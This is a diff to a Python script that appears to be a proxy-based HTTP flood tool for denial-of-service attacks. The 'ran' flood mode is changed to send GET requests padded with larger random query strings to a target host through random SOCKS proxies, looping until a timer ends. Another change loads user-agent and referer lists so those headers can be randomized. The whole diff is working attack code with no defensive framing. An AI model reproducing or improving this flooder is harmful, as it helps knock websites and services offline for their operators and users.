@@ -792,9 +792,9 @@ def slow(conn, socks_type):
             proxy = Choice(proxies).strip().split(":")
 
 def ran(event, socks_type):
-    header = Headers("cfb")
+    header = Headers("get")
     proxy = Choice(proxies).strip().split(":")
-    get_host = "GET " + path + "?/" + str(random._urandom(30)) + "HTTP/1.1\r\nHost: " + target + "\r\n"
+    get_host = "GET " + path + "?" + str(random._urandom(1995)) + "HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
     while time.time() < timer:
@@ -1224,9 +1224,9 @@ if __name__ == '__main__':
         makefile('files/referers.txt')
     try:
         with open("files/useragent.txt", "r") as f:
-            readuser = str(f.readlines()).replace('\n', '').replace('\r', '')
+            readuser = f.read().splitlines()
         with open("files/referers.txt", "r") as f:
-            readref = str(f.readlines()).replace('\n', '').replace('\r', '')
+            readref = f.read().splitlines()
         UserAgent = Choice(readuser)
         referers = Choice(readref)
         try:
